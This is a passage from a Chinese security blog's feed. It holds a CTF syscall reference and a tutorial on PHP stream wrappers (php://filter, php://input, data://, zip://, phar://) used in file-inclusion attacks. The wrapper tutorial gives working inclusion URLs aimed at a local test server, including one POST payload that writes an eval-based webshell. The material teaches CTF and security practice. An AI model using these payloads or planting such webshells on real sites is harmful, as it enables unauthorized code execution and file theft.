style="text-align:left">/</td></tr></tbody></table></div><p>此外，在<code>Windows</code>下<code>hint.php?</code>无法被解析为目录，在<code>linux</code>下成功认为是目录，原因为Windows系统文件命名不支持问号。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-函数漏洞问题&quot;&gt;&lt;a href=&quot;#0x00-函数漏洞问题&quot; class=&quot;headerlink&quot; title=&quot;0x00 函数漏洞问题&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 函数漏洞问题&lt;/code&gt;&lt;/font&gt;&lt;/h
      
    
    </summary>
    
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF中常见的函数总结</title>
    <link href="https://muzibing.github.io/2020/07/27/2020.07.27%EF%BC%88141%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/27/2020.07.27（141）/</id>
    <published>2020-07-26T16:00:00.000Z</published>
    <updated>2020-07-27T10:54:59.838Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-pwn题font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-pwn题font"></a> <font color="navy"><code>0x00 pwn题</code></font></h2><h3 id="font-color-blue1open函数font"><a class="markdownIt-Anchor" href="#font-color-blue1open函数font"></a> <font color="blue"><code>1.open()函数</code></font></h3><h4 id="函数原型"><a class="markdownIt-Anchor" href="#函数原型"></a> <code>函数原型</code></h4><blockquote><p><code>int open(const char *path, int flags,int mode)；</code></p></blockquote><p><code>flags</code></p><table><thead><tr><th style="text-align:center">常量名称</th><th style="text-align:center">数字</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">O_RDONLY</td><td style="text-align:center">0</td><td style="text-align:center">只读模式</td></tr><tr><td style="text-align:center">O_WRONLY</td><td style="text-align:center">1</td><td style="text-align:center">只写模式</td></tr><tr><td style="text-align:center">O_RDWR</td><td style="text-align:center">2</td><td style="text-align:center">可读可写</td></tr></tbody></table><h4 id="函数功能"><a class="markdownIt-Anchor" href="#函数功能"></a> <code>函数功能</code></h4><blockquote><p>以各种方式打开文件</p></blockquote><h4 id="函数返回值"><a class="markdownIt-Anchor" href="#函数返回值"></a> <code>函数返回值</code></h4><blockquote><p>如果调用成功，它将返回一个可以被<code>read</code>和<code>write</code>等其他系统调用使用的<font color="red"><code>文件描述符</code></font>。这个文件描述符是唯一的。它不会与任何其他运行中的进程共享，除非是fork了子进程。如果两个进程同时打开一个文件，他们会分别得到两个不同的文件描述符。如果他们都对文件进行写操作，那么他们会各写各的，它们分别接着自己上次离开的位置继续往下写，数据不会交织在一起，而是会彼此覆盖。我们可以使用文件锁功能来防止这种事件。’</p></blockquote><p><code>返回的文件描述符</code></p><blockquote><p>fd的值一般是<code>3</code>开始，依次增加。比如我open了两个文件，那么它们的fd分别为3和4。</p></blockquote><h4 id="系统调用号"><a class="markdownIt-Anchor" href="#系统调用号"></a> <code>系统调用号</code></h4><blockquote><p><code>2 open sys_open fs/open.c</code></p></blockquote><h3 id="font-color-blue2read函数font"><a class="markdownIt-Anchor" href="#font-color-blue2read函数font"></a> <font color="blue"><code>2.read()函数</code></font></h3><h4 id="头文件"><a class="markdownIt-Anchor" href="#头文件"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-2"><a class="markdownIt-Anchor" href="#函数原型-2"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t read(int fd, void *buf, size_t count);</code></p></blockquote><h4 id="函数功能-2"><a class="markdownIt-Anchor" href="#函数功能-2"></a> <code>函数功能</code></h4><blockquote><p>读取文件内容：<strong>read()会把参数<code>fd</code>所指的文件传送 <code>count</code>个字节到buf 指针所指的内存中</strong>。</p></blockquote><h4 id="函数返回值-2"><a class="markdownIt-Anchor" href="#函数返回值-2"></a> <code>函数返回值</code></h4><blockquote><p>参数count 为0，则read()不会有作用并返回0。返回值为实际读取到的字节数, 如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动：</p><ul><li>当文件的整体字节比<code>count</code>小时，读到文件尾、从管道(pipe)或终端机读取、我们读取时被一个信号打断了等等情况。</li><li>当有错误发生时则返回-1, 错误代码存入errno 中, 而文件读写位置则无法预期。</li></ul></blockquote><h4 id="测试用例"><a class="markdownIt-Anchor" href="#测试用例"></a> <code>测试用例</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">64</span>] =<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">int</span> fp = open(<span class="string">"./test.txt"</span>, O_RDONLY);<span class="comment">//只读模式打开文件</span></span><br><span class="line">    res = read(fp,buffer,<span class="number">60</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"read %d bits,they are %s\n"</span>,res,buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,strerror(errno));</span><br><span class="line">    close(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="系统调用号-2"><a class="markdownIt-Anchor" href="#系统调用号-2"></a> <code>系统调用号</code></h4><blockquote><p><code>0 read sys_read fs/read_write.c</code></p></blockquote><h3 id="font-color-blue3write函数font"><a class="markdownIt-Anchor" href="#font-color-blue3write函数font"></a> <font color="blue"><code>3.write()函数</code></font></h3><h4 id="头文件-2"><a class="markdownIt-Anchor" href="#头文件-2"></a> <code>头文件</code></h4><blockquote><p><code>#include&lt;unistd.h&gt;</code></p></blockquote><h4 id="函数原型-3"><a class="markdownIt-Anchor" href="#函数原型-3"></a> <code>函数原型</code></h4><blockquote><p><code>ssize_t write(int fd,const void *buf, size_t count);·</code></p><ul><li><strong>fd</strong>：是文件描述符（write所对应的是写，即就是1，这是标准输出）</li><li><strong>buf</strong>：通常是一个字符串，需要写入的字符串</li><li><strong>count</strong>：是每次写入的字节数</li></ul></blockquote><h4 id="函数功能-3"><a class="markdownIt-Anchor" href="#函数功能-3"></a> <code>函数功能</code></h4><blockquote><p>打印文件内容</p></blockquote><h4 id="函数返回值-3"><a class="markdownIt-Anchor" href="#函数返回值-3"></a> <code>函数返回值</code></h4><blockquote><ul><li><p>成功：返回读出的字节数</p></li><li><p>失败：返回-1，并设置errno，如果在调用 read 之前到达文件末尾，则这次read返回 0</p></li></ul></blockquote><h4 id="系统调用号-3"><a class="markdownIt-Anchor" href="#系统调用号-3"></a> <code>系统调用号</code></h4><blockquote><p><code>1 write sys_write fs/read_write.c</code></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-pwn题font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-pwn题font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x00 p
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>PHP伪协议总结</title>
    <link href="https://muzibing.github.io/2020/07/25/2020.07.25%EF%BC%88140%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/25/2020.07.25（140）/</id>
    <published>2020-07-24T16:00:00.000Z</published>
    <updated>2020-07-25T07:00:53.610Z</updated>
    
    <content type="html"><![CDATA[<h2 id="font-color-navy0x00-file协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x00-file协议font"></a> <font color="navy"><code>0x00 file://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p></li><li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/path/to/file.ext</span><br><span class="line">relative/path/to/file.ext</span><br><span class="line">fileInCwd.ext</span><br><span class="line">C:/path/to/winfile.ext</span><br><span class="line">C:\path\to\winfile.ext</span><br><span class="line">\\smbserver\share\path\to\winfile.ext</span><br><span class="line">file:///path/to/file.ext</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1. <code>file://[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-1.jpg" alt></p><p>      2. <code>[文件的绝对路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=./phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-2.jpg" alt></p><p>      3. <code>[http://网络路径和文件名]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-3.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></li></ul><h2 id="font-color-navy0x01-php协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x01-php协议font"></a> <font color="navy"><code>0x01 php://协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul></li><li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p></li><li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p></li></ul><table><thead><tr><th>协议</th><th>作用</th></tr></thead><tbody><tr><td>php://input</td><td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype=&quot;multipart/form-data&quot;</code> 的时候<code>php://input</code>是无效的。</td></tr><tr><td>php://output</td><td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td></tr><tr><td>php://fd</td><td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td></tr><tr><td>php://memory php://temp</td><td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td></tr><tr><td>php://filter</td><td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td></tr></tbody></table><ul><li><p><strong><code>php://filter</code>参数详解</strong></p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p></li></ul><table><thead><tr><th>php://filter 参数</th><th>描述</th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<em>|</em>）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（<strong>|</strong>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链</td></tr></tbody></table><ul><li><p><strong>可用的过滤器列表（4类）</strong></p><p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p></li></ul><p><code>字符串过滤器</code></p><table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><p><code>转换过滤器</code></p><table><thead><tr><th>转换过滤器</th><th style="text-align:left">作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td style="text-align:left">等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td style="text-align:left">quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><p><code>压缩过滤器</code></p><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><p><code>加密过滤器</code></p><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><ul><li><strong>示例</strong>：</li></ul><p>      1. <code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</span><br></pre></td></tr></table></figure><p><img src="/images/140-4.jpg" alt></p><p>      2.<code>php://input + [POST DATA]</code>执行php代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-5.jpg" alt></p><p>若有写入权限，写入一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=php://input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&apos;1juhua.php&apos;,&apos;w&apos;),&apos;&lt;?php @eval($_GET[cmd]); ?&gt;&apos;); ?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-6.jpg" alt></p><ul><li><strong>-参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></li></ul><h2 id="font-color-navy0x02-zip-bzip2-zlib-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x02-zip-bzip2-zlib-协议font"></a> <font color="navy"><code>0x02 zip:// &amp; bzip2:// &amp; zlib:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]`（#编码为%23）</p><p>      压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-7.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip2://file.bz2</span><br></pre></td></tr></table></figure><p>      2.压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</span><br></pre></td></tr></table></figure><p><img src="/images/140-8.jpg" alt></p><p>      3.compress.zlib://file.gz</p><p>      压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</span><br></pre></td></tr></table></figure><p><img src="/images/140-9.jpg" alt></p><ul><li><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></li></ul><h2 id="font-color-navy0x03-data-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x03-data-协议font"></a> <font color="navy"><code>0x03 data:// 协议</code></font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,</span><br><span class="line">data://text/plain;base64,</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p></li></ul><p>      1.data://text/plain,`</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/140-10.jpg" alt></p><p>      2.data://text/plain;base64,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p><img src="/images/140-11.jpg" alt></p><h2 id="font-color-navy0x04-http-https协议-font"><a class="markdownIt-Anchor" href="#font-color-navy0x04-http-https协议-font"></a> <font color="navy"><code>0x04 http:// &amp; https://协议</code> </font></h2><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></li><li><p><strong>示例</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-12.jpg" alt></p></li></ul><h2 id="font-color-navy0x05-phar-协议font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-phar-协议font"></a> <font color="navy"><code>0x05 phar:// 协议</code></font></h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/140-13.jpg" alt></p><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p><blockquote><p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a></p></blockquote><h3 id="font-color-navy0x06-参考文章font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-参考文章font"></a> <font color="navy"><code>0x06 参考文章</code></font></h3><p><a href="https://zhuanlan.zhihu.com/p/25069779" target="_blank" rel="noopener">文件包含漏洞原理分析</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;font-color-navy0x00-file协议font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-file协议font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;navy&quot;&gt;&lt;code&gt;0x
      
    
    </summary>
    
    
      <category term="基础知识" scheme="https://muzibing.github.io/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>CTF-web 类型题目总结</title>
    <link href="https://muzibing.github.io/2020/07/24/2020.07.24%EF%BC%88139%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/07/24/2020.07.24（139）/</id>
    <published>2020-07-23T16:00:00.000Z</published>
    <updated>2020-08-17T14:27:59.670Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="692903eb44847d6e7ca78b57bc76c46b1bb17cf17332e58bde7c47c7b09844a9"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
  </entry>
  
</feed>
